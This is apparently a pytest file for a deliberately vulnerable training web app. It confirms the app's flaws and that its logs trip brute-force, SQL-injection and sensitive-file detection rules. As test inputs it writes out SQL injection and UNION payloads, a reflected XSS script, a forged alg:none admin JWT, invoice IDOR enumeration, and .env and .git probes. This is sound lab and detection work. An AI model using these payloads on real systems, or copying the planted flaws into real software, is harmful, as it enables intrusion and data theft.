"""The intentionally vulnerable Acme Portal: its flaws exist, and its telemetry trips real detections."""

from __future__ import annotations

import importlib.util
import queue
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

pytest.importorskip("multipart")

APP_PATH = Path(__file__).resolve().parents[3] / "labs" / "web" / "vulnerable-app" / "app.py"


@pytest.fixture(scope="module")
def portal():  # type: ignore[no-untyped-def]
    spec = importlib.util.spec_from_file_location("acme_portal", APP_PATH)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture()
def lab(portal):  # type: ignore[no-untyped-def]
    portal.events = queue.Queue(maxsize=2000)  # capture shipped telemetry in-process
    return TestClient(portal.app)


def login(lab: TestClient, user: str, password: str):  # type: ignore[no-untyped-def]
    return lab.post("/login", json={"username": user, "password": password})


def test_login_has_no_lockout(lab: TestClient) -> None:
    for i in range(15):
        assert login(lab, "jsmith", f"wrong-{i}").status_code == 401
    ok = login(lab, "jsmith", "Summer2024!")
    assert ok.status_code == 200 and ok.json()["token"].count(".") == 2


def test_search_is_injectable_and_reflects_input(lab: TestClient) -> None:
    normal = lab.get("/search", params={"q": "laptop"}).text
    injected = lab.get("/search", params={"q": "' OR '1'='1"}).text
    assert normal.count("<tr>") == 2 and injected.count("<tr>") == 5  # every product leaked
    union = lab.get("/search", params={"q": "zzz' UNION SELECT id, username, 0 FROM users--"}).text
    assert "alice" in union  # fake users table, in-memory only
    assert (
        "<script>alert(1)</script>"
        in lab.get("/search", params={"q": "<script>alert(1)</script>"}).text
    )


def test_idor_lets_any_valid_session_read_any_invoice(lab: TestClient) -> None:
    token = login(lab, "bob", "bob-lab-pass").json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    owners = {
        lab.get(f"/api/invoices/{i}", headers=headers).json()["owner"] for i in range(1001, 1010)
    }
    assert owners == {"alice", "jsmith", "bob"}
    assert lab.get("/api/invoices/1001").status_code == 401  # a session is still required


def test_jwt_verifier_accepts_alg_none(portal, lab: TestClient) -> None:  # type: ignore[no-untyped-def]
    user_token = login(lab, "alice", "alice-lab-pass").json()["token"]
    assert (
        lab.get("/api/admin/users", headers={"Authorization": f"Bearer {user_token}"}).status_code
        == 403
    )
    header = portal._b64(b'{"alg":"none","typ":"JWT"}')
    payload = portal._b64(b'{"sub":"alice","role":"admin"}')
    forged = f"{header}.{payload}."
    assert (
        lab.get("/api/admin/users", headers={"Authorization": f"Bearer {forged}"}).status_code
        == 200
    )
    tampered = user_token.rsplit(".", 1)[0] + ".AAAA"
    assert (
        lab.get("/api/admin/users", headers={"Authorization": f"Bearer {tampered}"}).status_code
        == 401
    )


def test_secrets_are_served_but_are_obviously_fake(lab: TestClient) -> None:
    body = lab.get("/.env").text
    assert "FAKE" in body and "CF-CANARY-" in body and "cf_demo_0000000000000000" in body
    assert "repositoryformatversion" in lab.get("/.git/config").text


def test_no_rate_limit_on_coupon_redemption(lab: TestClient) -> None:
    assert all(lab.post("/api/v1/coupons/redeem").status_code == 200 for _ in range(150))


def test_access_log_events_trip_the_real_detections(
    portal, lab: TestClient, client: TestClient
) -> None:  # type: ignore[no-untyped-def]
    """Ship what the app logs to the CyberForge ingest endpoint and expect alerts."""
    for i in range(12):
        login(lab, "jsmith", f"guess-{i}")
    lab.get("/search", params={"q": "1' UNION SELECT id, username, 0 FROM users--"})
    lab.get("/.env")
    shipped = []
    while not portal.events.empty():
        shipped.append(portal.events.get_nowait())
    assert len(shipped) >= 14 and shipped[0]["fields"]["cs-method"] == "POST"
    for event in shipped:
        event["fields"]["c-ip"] = "198.51.100.90"  # the gateway would set the client address
    result = client.post(
        "/api/v1/events/ingest",
        json={"source_label": "acme-portal", "events": shipped},
        headers={"X-Lab-Token": "test-ingest-token"},
    )
    assert result.status_code == 202 and result.json()["alerts_created"] >= 3
    rules = {
        a["rule"]["slug"]
        for a in client.get("/api/v1/alerts?page_size=200&sort=timestamp&order=desc").json()[
            "items"
        ][:12]
    }
    assert {
        "web-login-brute-force-burst",
        "web-sql-injection-probe",
        "web-sensitive-file-probe",
    } <= rules
